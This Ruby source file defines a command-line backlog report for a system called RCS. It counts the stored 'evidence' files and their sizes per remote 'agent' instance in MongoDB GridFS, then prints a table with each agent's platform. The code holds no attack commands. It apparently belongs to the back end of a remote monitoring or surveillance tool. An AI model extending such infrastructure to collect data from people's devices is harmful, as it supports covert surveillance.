# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/path_utils'

require_release 'rcs-db/db'
require_release 'rcs-db/grid'
require_release 'rcs-db/evidence_dispatcher'

module RCS
module Worker

class WorkerBacklog
  include Singleton
  include RCS::Tracer

  def run(options)

    # config file parsing
    return 1 unless RCS::DB::Config.instance.load_from_file

    # connect to MongoDB
    return 1 unless RCS::DB::DB.instance.connect

    # calculate the number and the size of all the evidece for each instance
    entries = {}
    RCS::Worker::GridFS.get_distinct_filenames("evidence").each do |inst|
      entries[inst] = {count: 0, size: 0}
      RCS::Worker::GridFS.get_by_filename(inst, "evidence").each do |i|
        entries[inst][:count] += 1
        entries[inst][:size] += i["length"]
      end
    end

    # this will become an array
    entries = entries.sort_by {|k,v| k}

    # table definitions
    table_width = 91
    table_line = '+' + '-' * table_width + '+'

    # print the table header
    puts
    puts table_line
    puts '|' + 'instance'.center(57) + '|' + 'platform'.center(12) + '|' + 'logs'.center(6) + '|' + 'size'.center(13) + '|'
    puts table_line

    entries.each do |entry|

      ident = entry[0].slice(0..13)
      instance = entry[0].slice(15..-1)
      agent = ::Item.agents.where({ident: ident, instance: instance}).first

      puts "| #{entry[0]} |#{agent[:platform].center(12)}|#{entry[1][:count].to_s.rjust(5)} | #{entry[1][:size].to_s_bytes.rjust(11)} |"
    end

    puts table_line
    puts

    return 0
  end

  # executed from rcs-worker-queue
  def self.run!(*argv)
    # reopen the class and declare any empty trace method
    # if called from command line, we don't have the trace facility
    self.class_eval do
      def trace(level, message)
        puts message
      end
    end

    DB.class_eval do
      def trace(level, message)
        puts message
      end
    end

    # This hash will hold all of the options parsed from the command-line by OptionParser.
    options = {}

    optparse = OptionParser.new do |opts|
      opts.banner = "Usage: rcs-worker-queue [options] "

      opts.on( '-h', '--help', 'Display this screen' ) do
        puts opts
        return 0
      end
    end

    optparse.parse(argv)

    # execute the manager
    return WorkerBacklog.instance.run(options)
  end
end # EvidenceDispatcher

end # ::DB
end # ::RCS
